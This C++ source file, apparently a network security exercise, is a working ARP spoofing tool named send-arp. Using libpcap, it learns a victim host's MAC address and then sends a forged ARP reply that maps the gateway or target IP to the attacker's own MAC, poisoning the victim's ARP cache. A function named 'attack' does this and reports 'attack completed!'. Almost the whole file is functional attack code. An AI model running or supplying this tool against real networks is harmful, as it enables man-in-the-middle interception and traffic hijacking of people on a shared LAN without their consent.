#include<net/if.h>
#include<net/if_arp.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<stdint.h>
#include<cstdio>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
static const int ARP_SIZE = sizeof(struct ArpHdr);
void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> <sender ip 2> <target ip 2> ...\n");
	printf("sample: send-arp wlan0 172.30.1.78 172.30.1.46\n");
}
int get_my_mac(char *if_name, char *dst) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;

    strncpy(s.ifr_name, if_name, IFNAMSIZ);
     
    if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
        return -2;
    }

    mac = (u_char*)s.ifr_addr.sa_data;
    sprintf(dst,"%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return 0;
}
int get_my_ip(char* if_name, char* dst){
	struct ifreq ifr;
	int sockfd, ret;
	
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Faile to get interface MAC address - socket() failed - %m\n");
		exit(1);
	}
	
	strncpy(ifr.ifr_name, if_name, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		
		close(sockfd);
		exit(1);
	}
	
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, dst, sizeof(struct sockaddr));
	close(sockfd);
	return 0;
}
int send_arp(pcap_t *handle, Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, int opt){
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device\n");
		return -1;
	}
	EthArpPacket packet;
	
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(opt);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	return 0;
}
int attack(char* dev, char* sip, char* tip){
	char errbuf[PCAP_ERRBUF_SIZE];
	char mymac[0x100]={0,};
	char myip[0x100]={0,};
	char smac[0x100]={0,};
	char pktip[0x100]={0,};
	
	get_my_mac(dev,mymac);
	get_my_ip(dev,myip);
	printf("my mac and ip: %s %s\n",mymac,myip);
	
	pcap_t* handle = pcap_open_live(dev, ARP_SIZE, 1, 1, errbuf);
	int tmp = send_arp(handle,Mac("ff:ff:ff:ff:ff:ff"),Mac(mymac),Mac("00:00:00:00:00:00"),Ip(myip),Ip(sip),ArpHdr::Request);
	if(tmp==-1) return -1;
	printf("sended arp request!\n");
	while(1){
		struct pcap_pkthdr* headr;
		const u_char* pkt_data;
		int res = pcap_next_ex(handle, &headr, &pkt_data);
		/*for(int i=0; i<=41; i++) printf("%x,",pkt_data[i]);
		printf("\n");*/
		if(res!=1){
			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res,pcap_geterr(handle));
			return -1;
		}
		//sprintf(pktip, "%d.%d.%d.%d\x00", pkt_data[28],pkt_data[29],pkt_data[30],pkt_data[31]);
		uint16_t type = ntohs(*(uint16_t*)(&pkt_data[12]));
		/*if(type == 0x0806 && strcmp(pktip, sip)==0){
			sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x",pkt_data[22],pkt_data[23],pkt_data[24],pkt_data[25],pkt_data[26],pkt_data[27]);
			break;
		}*/
		//printf("%0x\n",type);
		uint16_t op = ntohs(*(uint16_t*)(&pkt_data[20]));
		if(type == 0x0806 && op==ArpHdr::Reply){
			sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x",pkt_data[22],pkt_data[23],pkt_data[24],pkt_data[25],pkt_data[26],pkt_data[27]);
			break;
		}
		
	}
	pcap_close(handle);
	printf("\nSender's mac address captured\n");
	printf("%s\n",smac);
	
	handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	tmp = send_arp(handle,Mac(smac),Mac(mymac),Mac(smac),Ip(tip),Ip(sip),ArpHdr::Reply);
	if(tmp==-1) return -1;
	pcap_close(handle);
	printf("attack completed!\n");
	return 0;
}
int main(int argc, char* argv[]) {
	if (argc<4 || argc%2!=0) {
		usage();
		return -1;
	}
	int i;
	for(i=1; i<=argc/2-1; i++){
		attack(argv[1],argv[i*2],argv[i*2+1]);
	}
	return 0;
}
